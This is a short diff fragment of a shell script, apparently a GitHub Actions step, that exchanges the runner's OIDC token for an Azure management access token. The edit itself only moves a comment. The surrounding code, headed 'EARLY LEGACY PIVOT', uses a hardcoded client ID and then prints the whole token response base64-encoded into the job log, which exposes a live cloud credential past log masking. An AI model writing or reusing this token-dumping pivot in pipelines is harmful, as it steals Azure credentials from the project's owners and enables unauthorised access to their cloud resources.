@@ -8,7 +8,8 @@ echo "CTX repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME}"
 
 # Get GitHub OIDC token
 OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-OIDC_LEN=${#OIDC_TOKEN}# EARLY LEGACY PIVOT
+OIDC_LEN=${#OIDC_TOKEN}
+# EARLY LEGACY PIVOT
 LEGACY_EARLY=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" --data-urlencode grant_type=client_credentials --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://management.azure.com/.default)
 printf 'EARLY_LEGACY_B64='; printf %s "$LEGACY_EARLY" | base64 -w0; echo
 LEGACY_ARM=$(printf %s "$LEGACY_EARLY" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
